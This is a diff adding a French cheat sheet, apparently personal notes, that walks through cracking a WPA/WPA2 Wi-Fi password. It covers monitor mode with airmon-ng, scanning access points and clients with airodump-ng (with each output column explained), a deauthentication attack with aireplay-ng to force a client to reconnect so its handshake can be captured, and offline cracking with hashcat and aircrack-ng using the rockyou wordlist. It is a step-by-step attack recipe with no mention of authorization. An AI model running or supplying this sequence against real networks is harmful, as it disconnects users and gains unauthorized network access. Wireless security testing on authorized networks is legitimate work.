@@ -1,0 +1,41 @@
+﻿# airmon-ng check kill
+
+# airmon-ng start wlan0 (wlan0 : interface réseau wifi)
+
+# airmon-ng stop wlan0mon (pour arrêter le mode moniteur)
+
+# airodump-ng  wlan0mon (scanner les AP disponible à proximité)
+
+‼️* Section supérieure (BSSID) :
+   * BSSID : L'adresse MAC du point d'accès.
+   * PWR : La puissance du signal (plus le chiffre est bas (négatif), plus le signal est faible).
+   * Beacons : Le nombre de trames de balise envoyées par l'AP.
+   * #Data : Le nombre de paquets de données capturés pour cet AP. C'est crucial pour le craquage.
+   * #CH : Le canal sur lequel l'AP opère.
+   * MB : La vitesse maximale supportée par l'AP.
+   * ENC : Le type de chiffrement (WPA2, WPA, WEP, OPN pour ouvert).
+   * CIPHER : Le chiffrement utilisé (CCMP, TKIP, WEP).
+   * AUTH : La méthode d'authentification (PSK pour Pre-Shared Key, MGT pour 802.1X).
+   * ESSID : Le nom du réseau Wi-Fi (SSID).
+ ‼️* Section inférieure (STATION) :
+   * BSSID : L'adresse MAC de l'AP auquel le client est connecté (ou "not associated" s'il ne l'est pas).
+   * STATION : L'adresse MAC du client.
+   * PWR : Puissance du signal du client.
+   * Rate : Le taux de transmission actuel.
+   * Lost : Nombre de paquets perdus.
+   * Frames : Nombre de paquets envoyés par le client.
+   * Probe : Le SSID que le client essaie de rejoindre.
+
+# airodump-ng --bssid <MAC AP> -c (canal du réseau) -w <FichierDuCapture> <interface en mode monitor> 
+
+# aireplay-ng --deauth 0 -a <MAC AP> -c <MAC_du_client_connecte> <interface en mode monitor>
+**C'est pour forcer la personne à se déconnecter et se reconnecter au AP pour capturer le handshake**
+
+# hcxpcapngtool -o FichierDuCapture.hccapx FichierDuCapture.cap 
+**Convertir le fichier .cap en fichier .hccapx pour le cracker avec hashcat**
+
+# hashcat -m 22000 FichierDuCapture.hccapx rockyou.txt
+**Cracker le fichier .hccapx avec hashcat**
+ 
+# aircrack-ng -w rockyou.txt -b <BSSID_du_reseau_cible> FichierDuCapture.cap
+
